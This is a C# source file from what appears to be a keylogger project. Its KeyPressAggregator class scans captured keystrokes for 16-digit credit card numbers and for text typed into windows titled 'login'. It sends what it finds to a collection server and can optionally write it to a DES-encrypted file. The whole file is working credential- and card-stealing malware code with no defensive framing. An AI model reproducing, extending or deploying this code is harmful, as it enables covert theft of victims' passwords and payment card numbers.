using HookKeylogger.AggergationServer.Types;
using HookKeylogger.Base;
using System;
using System.Collections.Concurrent;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace KeypressAggregator
{
    /// <summary>
    /// Aggregate key presses from the keylogger. Perform analysis on the incoming key press stream to extract useful
    /// and interesting confidential information since we don't care about the majority of keypresses.
    /// </summary>
    class KeyPressAggergator
    {
        private ConcurrentQueue<KeyPress> inq;
        private ServerClient client;
        private string outFName;
        private string sKey;
        private bool toFile = false;

        public KeyPressAggergator(ConcurrentQueue<KeyPress> q, ServerClient client)
        {
            this.client = client;
            this.inq = q;
        }
        public KeyPressAggergator(ConcurrentQueue<KeyPress> q,  ServerClient client, string file, string key) : this(q, client)
        {
            this.outFName = file;
            this.sKey = key;
        }

        //This writes and encrypts the file with the string data
        //https://support.microsoft.com/en-us/kb/307010
        private static void EncryptWriteInfo(string data, string outFName, string sKey)
        {
            // This text is added only once to the file.
            if (!File.Exists(outFName))
            {
                // Create a file to write to.
                File.WriteAllText(outFName, data);
            }
            else
            {
                File.Delete(outFName);
                // Create a file to write to.
                File.WriteAllText(outFName, data);
            }

            FileStream fsEncrypted = new FileStream(outFName, FileMode.Create, FileAccess.Write);
            DESCryptoServiceProvider DES = new DESCryptoServiceProvider();
            DES.Key = ASCIIEncoding.ASCII.GetBytes(sKey);
            DES.IV = ASCIIEncoding.ASCII.GetBytes(sKey);
            ICryptoTransform desencrypt = DES.CreateEncryptor();
            CryptoStream cryptostream = new CryptoStream(fsEncrypted, desencrypt, CryptoStreamMode.Write);
            byte[] bytearrayinput = Encoding.ASCII.GetBytes(data);
            cryptostream.Write(bytearrayinput, 0, bytearrayinput.Length);
            cryptostream.Close();
        }

        private CI createCi(string type, string data)
        {
            CI ci = new CI();
            ci.Type = type;
            ci.Data = data;
            return ci;
        }

        /// <summary>
        /// Process the keys in the input keypress buffer, try to extract useful information from it. If we find useful
        /// information send it to the server.
        /// </summary>
        public void Scan()
        {
            // Counter for credit card
            int creditCard = 0;
            String creditNum = "";

            // Boolean for login page
            Boolean isPswrd = false;
            String password = "";
            string data = "";
            
            while (this.inq != null)
            {
                KeyPress ks;
                while (inq.TryDequeue(out ks))
                {
                    bool foundInfo = false;

                    // Looks for a credit card number, ie 16 consecutive digits
                    // A number is between 48 and 57. If there is a match, the count
                    // is incremented and the number is added to string. Otherwise
                    // the count is reset to 0 and the string is cleared
                    if (ks.Key > 47 && ks.Key < 58)
                    {
                        creditCard += 1;
                        creditNum += ((Keys)ks.Key).ToString();
                        if (creditCard % 4 == 0)
                        {
                            creditNum += " ";
                        }
                    }
                    else
                    {
                        creditCard = 0;
                        creditNum = "";
                    }
                    // If there are a total of 16 consecutive numbers, the credit card
                    // number is sent to the file
                    if (creditCard == 16)
                    {
                        creditCard = 0;
                        var ci = createCi( "CCN", creditNum);
                        //Console.WriteLine("CNN: " + ci.Data);
                        client.Send(ci);
                        data = data + "DATA: " + ci.Data;
                        foundInfo = true;
                        creditNum = "";
                    }

                    // If the chrome window has the word login, just record everything to send
                    if (ks.ActiveProgram.Contains("login"))
                    {
                        if(isPswrd == false)
                        {
                            isPswrd = true;

                        }
                        password += ((Keys)ks.Key).ToString();
                    }
                    else
                    {
                        if(isPswrd == true)
                        {
                            var ci = createCi("PSW", password);
                            client.Send( ci );
                            //Console.WriteLine("PSW: " + ci.Data);
                            data = data + "DATA: " + ci.Data;
                            isPswrd = false;
                            password = "";
                            foundInfo = true;
                        }
                    }
                    // If writing to a file is enabled write to an encrypted file.
                    if (toFile && foundInfo)
                    {
                        EncryptWriteInfo(data, outFName, sKey);
                        data = "";
                    }
                }
                Thread.Sleep(1000);
            }
        }
    }
}
